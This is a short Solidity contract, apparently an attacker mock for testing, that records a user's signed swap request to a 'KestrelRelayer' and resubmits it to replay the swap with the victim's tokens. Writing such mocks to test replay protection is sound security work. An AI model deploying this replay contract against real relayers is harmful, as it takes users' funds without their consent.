// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import { KestrelRelayer } from "kestrel/KestrelRelayer.sol";

/// @notice REPLAY attacker: records a signed request it saw relayed (in the mempool, or on
///         another chain) and submits it again.
contract SignatureReplayer {
    /// @notice Target relayer.
    KestrelRelayer public immutable relayer;
    /// @notice The captured request.
    KestrelRelayer.SwapRequest internal captured;
    /// @notice The captured signature.
    bytes internal capturedSig;

    /// @param _relayer Target relayer.
    constructor(KestrelRelayer _relayer) {
        relayer = _relayer;
    }

    /// @notice Record a request and its signature.
    /// @param req The request.
    /// @param sig The user's signature.
    function capture(KestrelRelayer.SwapRequest calldata req, bytes calldata sig) external {
        captured = req;
        capturedSig = sig;
    }

    /// @notice Relay the captured request again.
    /// @return amountOut Output bought with the victim's tokens for `captured.to`.
    function replay() external returns (uint256 amountOut) {
        amountOut = relayer.relaySwap(captured, capturedSig);
    }
}
